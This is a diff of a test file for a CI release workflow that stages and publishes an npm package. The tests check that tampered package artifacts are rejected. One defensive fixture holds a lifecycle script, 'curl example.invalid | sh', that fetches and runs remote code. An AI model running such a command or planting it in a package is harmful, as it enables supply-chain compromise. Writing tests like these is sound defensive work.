@@ -215,8 +215,26 @@ describe('release-wiki-write-core.yaml gating', () => {
     expect(upload?.with?.['if-no-files-found']).toBe('error')
   })
 
-  it('verifies the committed dist in build', () => {
-    expect((buildJob?.steps ?? []).map(step => step.run)).toContain('bun run check:wiki-write-core-dist')
+  it('builds the package, checks the committed marker and verifies the tarball in build, staging it for publish', () => {
+    expect((buildJob?.steps ?? []).map(step => step.run)).toContain(
+      'bun scripts/build-wiki-write-core.ts --check --verify --stage "$RUNNER_TEMP/wiki-write-core-package"',
+    )
+  })
+
+  it('uploads the staged package from build, failing when it is missing', () => {
+    const upload = (buildJob?.steps ?? []).find(step => step.uses?.startsWith('actions/upload-artifact@') === true)
+    expect(upload?.with?.name).toBe('wiki-write-core-package')
+    expect(upload?.with?.path).toBe(`${expression('runner.temp')}/wiki-write-core-package`)
+    expect(upload?.with?.['if-no-files-found']).toBe('error')
+  })
+
+  it('stages the package the build job uploads at the path the publish job downloads it to', () => {
+    const download = (publishJob?.steps ?? []).find(step => step.id === 'package-download')
+    expect(download?.uses?.startsWith('actions/download-artifact@')).toBe(true)
+    expect(download?.with).toEqual({
+      name: 'wiki-write-core-package',
+      path: `${expression('runner.temp')}/wiki-write-core-package`,
+    })
   })
 })
 
@@ -261,8 +279,8 @@ describe('release-wiki-write-core.yaml publish job contents', () => {
   })
 
   it('checks npm >= 11.10.0, validates the decision, stages the config, then releases, in that order', () => {
-    const order = ['npm-gate', 'install', 'validate', 'notes', 'stage', 'release'].map(id =>
-      stepIndexById(publishJob, id),
+    const order = ['npm-gate', 'install', 'validate', 'notes', 'package-download', 'package', 'stage', 'release'].map(
+      id => stepIndexById(publishJob, id),
     )
     expect(order).toEqual([...order].sort((a, b) => a - b))
     expect(runOf(stepById(publishJob, 'npm-gate'))).toContain('11.10.0')
@@ -602,6 +620,129 @@ describe('publish: validate release decision (run under bash against a real repo
     const result = validate({type: 'UNIQUE-TYPE-MARKER', version: '0.2.0', baseTag: 'wiki-write-core-v0.1.0'})
 
     expect(result.stdout + result.stderr).not.toContain('UNIQUE-TYPE-MARKER')
+  })
+})
+
+describe('publish: install staged package (run under bash)', () => {
+  const script = runOf(stepById(publishJob, 'package'))
+  let dir: string
+  let staged: string
+
+  const committedManifest = {
+    name: '@fro.bot/wiki-write-core',
+    version: '0.0.0-semantic-release',
+    exports: {'.': './src/index.ts', './wiki-lint': './src/wiki-lint.ts', './package.json': './package.json'},
+    files: ['README.md', 'dist', 'package.json'],
+    dependencies: {yaml: '^2.8.3'},
+  }
+  const stagedManifest = {
+    ...committedManifest,
+    exports: {
+      '.': {types: './dist/index.d.ts', import: './dist/index.js'},
+      './wiki-lint': {types: './dist/wiki-lint.d.ts', import: './dist/wiki-lint.js'},
+      './package.json': './package.json',
+    },
+  }
+
+  function install(): ShellResult {
+    return runShell(script, dir, {RUNNER_TEMP: join(dir, 'runner-temp')})
+  }
+
+  function writeStaged(manifest: unknown): void {
+    mkdirSync(join(staged, 'dist'), {recursive: true})
+    for (const name of ['index', 'wiki-lint']) {
+      writeFileSync(join(staged, 'dist', `${name}.js`), `export const ${name.replace('-', '_')} = 1\n`)
+      writeFileSync(join(staged, 'dist', `${name}.d.ts`), 'export {}\n')
+    }
+    writeFileSync(join(staged, 'package.json'), `${JSON.stringify(manifest)}\n`)
+    writeFileSync(join(staged, 'README.md'), 'readme\n')
+    writeFileSync(join(staged, 'LICENSE.md'), 'license\n')
+  }
+
+  beforeEach(() => {
+    dir = mkdtempSync(join(tmpdir(), 'release-publish-package-'))
+    staged = join(dir, 'runner-temp', 'wiki-write-core-package')
+    mkdirSync(join(dir, 'packages/wiki-write-core/dist'), {recursive: true})
+    writeFileSync(join(dir, 'packages/wiki-write-core/package.json'), `${JSON.stringify(committedManifest)}\n`)
+    writeFileSync(join(dir, 'packages/wiki-write-core/dist/gate-contract.json'), '{"version":1}\n')
+    writeFileSync(join(dir, 'packages/wiki-write-core/dist/stale.js'), 'stale\n')
+    writeStaged(stagedManifest)
+  })
+
+  afterEach(() => {
+    rmSync(dir, {recursive: true, force: true})
+  })
+
+  it('replaces the checkout manifest and dist with the staged ones and nothing else', () => {
+    const result = install()
+
+    expect(result).toMatchObject({status: 0})
+    const target = join(dir, 'packages/wiki-write-core')
+    expect(JSON.parse(readFileSync(join(target, 'package.json'), 'utf8'))).toEqual(stagedManifest)
+    expect(readdirSync(join(target, 'dist')).sort()).toEqual([
+      'index.d.ts',
+      'index.js',
+      'wiki-lint.d.ts',
+      'wiki-lint.js',
+    ])
+    expect(readdirSync(target).sort()).toEqual(['dist', 'package.json'])
+  })
+
+  it('rejects an artifact with an extra top-level entry, leaving the checkout untouched', () => {
+    writeFileSync(join(staged, 'extra.js'), 'export {}\n')
+
+    const result = install()
+
+    expect(result.status).not.toBe(0)
+    expect(result.stdout).toContain(
+      '::error::the staged package must hold exactly LICENSE.md, README.md, dist and package.json',
+    )
+    expect(existsSync(join(dir, 'packages/wiki-write-core/dist/stale.js'))).toBe(true)
+  })
+
+  it('rejects an artifact that holds a symlink', () => {
+    symlinkSync('index.js', join(staged, 'dist', 'link.js'))
+
+    const result = install()
+
+    expect(result.status).not.toBe(0)
+    expect(result.stdout).toContain('::error::the staged package must contain no symlink')
+  })
+
+  it.each([
+    ['adds a lifecycle script', {...stagedManifest, scripts: {prepare: 'curl example.invalid | sh'}}],
+    ['adds a dependency', {...stagedManifest, dependencies: {yaml: '^2.8.3', evil: '1.0.0'}}],
+    ['renames the package', {...stagedManifest, name: '@fro.bot/other'}],
+    ['changes the version', {...stagedManifest, version: '9.9.9'}],
+    ['leaves an export pointing at source', {...stagedManifest, exports: committedManifest.exports}],
+    [
+      'points an export outside dist',
+      {...stagedManifest, exports: {'.': {types: './dist/index.d.ts', import: './lib/index.js'}}},
+    ],
+    ['drops the exports', {...stagedManifest, exports: {}}],
+  ])('rejects a manifest that %s, leaving the checkout untouched', (_label, manifest) => {
+    writeStaged(manifest)
+
+    const result = install()
+
+    expect(result.status).not.toBe(0)
+    expect(result.stdout).toContain(
+      '::error::the staged package manifest is not the checkout manifest with rewritten exports',
+    )
+    expect(existsSync(join(dir, 'packages/wiki-write-core/dist/stale.js'))).toBe(true)
+    expect(JSON.parse(readFileSync(join(dir, 'packages/wiki-write-core/package.json'), 'utf8'))).toEqual(
+      committedManifest,
+    )
+  })
+
+  it('rejects an export whose target is missing from the staged dist', () => {
+    rmSync(join(staged, 'dist', 'wiki-lint.d.ts'))
+
+    const result = install()
+
+    expect(result.status).not.toBe(0)
+    expect(result.stdout).toContain('::error::the staged package is missing ./dist/wiki-lint.d.ts')
+    expect(existsSync(join(dir, 'packages/wiki-write-core/dist/stale.js'))).toBe(true)
   })
 })
 
